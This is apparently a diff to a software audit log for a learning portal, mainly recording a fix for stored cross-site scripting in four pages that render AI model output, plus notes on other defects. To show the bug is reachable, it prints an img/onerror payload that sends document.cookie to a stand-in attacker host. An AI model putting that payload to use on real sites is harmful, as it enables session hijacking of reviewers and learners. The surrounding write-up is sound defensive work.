@@ -109,10 +109,16 @@ So attendance is the one criterion that still reads its stored column, deliberat
 ### D-13 · F-8, F-9 — bespoke inline-styled UI
 1,441 inline `style={{}}` objects vs 454 `className`s; two shared components in use; 23 fixed grids with no media queries. Out of scope.
 
-### D-14 · F-38 — stored XSS in four AI-output render sites
-`dangerouslySetInnerHTML` with a `**bold**` → `<strong>` replacement and no HTML escaping, at `app/portal/writing-check/page.tsx:210`, `app/portal/interview/page.tsx:304`, `app/portal/simulation/page.tsx:402`, `app/admin/reviews/page.tsx:231`. The admin-reviews site renders learner-influenced content in the admin's session.
+### D-14 · F-38 — stored XSS in four AI-output render sites — **FIXED**
+`dangerouslySetInnerHTML` with a `**bold**` → `<strong>` replacement and no HTML escaping, at `app/portal/writing-check/page.tsx`, `app/portal/interview/page.tsx`, `app/portal/simulation/page.tsx` and `app/admin/reviews/page.tsx`. A grep for `dangerouslySetInnerHTML` confirms those four were the only render sites in the repo.
 
-Not fixed here: the brief scopes this run to F-12/13/14/16/19 plus schema truth. **This is the one deferred item I would argue for pulling forward** — it is a real security defect with a small, contained fix (escape before replacing), and it is not entangled with the rebuild.
+**Why it was reachable, not theoretical.** The rendered text is a model's reply to text a *learner* wrote, and these prompts explicitly ask the model to quote the learner's own words back (`app/api/writing-check/route.ts`: *"reference actual text from the document"*). So a learner pastes `<img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">` into the writing checker, it comes back quoted in the report, and it executes. On `/admin/reviews` it executes in the reviewer's session — the account that can edit every learner's record.
+
+**Fixed** by `lib/render-ai-output.ts`. All four sites now call `renderAiMarkup()` (or `renderAiMarkupWithTables()` for the writing checker's pipe tables). The order is the whole fix: **escape first, then insert our own tags.** Escaping afterwards would destroy the tags just added, and stripping known-bad tags is a denylist that must be right about every vector forever, where escaping must be right about five characters. The only tags that can now appear are the `<strong>`, `<div>` and `<span>` that file writes.
+
+Verified by `scripts/verify-ai-output-escaping.ts` — 36 assertions covering 12 real payloads (script, img/onerror, svg/onload, iframe, attribute-breakout, base tag, payloads nested in bold markers) through both renderers, that legitimate `**bold**`, ampersands and tables still render, and a static sweep that no render site bypasses the helper. Mutation-tested: removing the escape from the helper and restoring one inline `.replace()` produced 14 failures and exit 1.
+
+Worth noting for whoever reads the tests: two of the first assertions I wrote were wrong, not the fix. Checking `!output.includes('onerror=')` fails on correctly-escaped output, because `&lt;img src=x onerror=alert(1)&gt;` legitimately *contains* that text as inert characters. The assertion now strips the tags we write and requires that no angle bracket survives, which is the property that actually matters.
 
 ### D-15 · F-33 — portfolio add is permanently broken — **FIXED in Milestone 4**
 `app/api/admin/data/route.ts` wrote `submitted_at`, which `portfolio_items` does not have. Production has **0 rows** in that table, consistent with every insert having always failed. Learners saw an `alert()`.
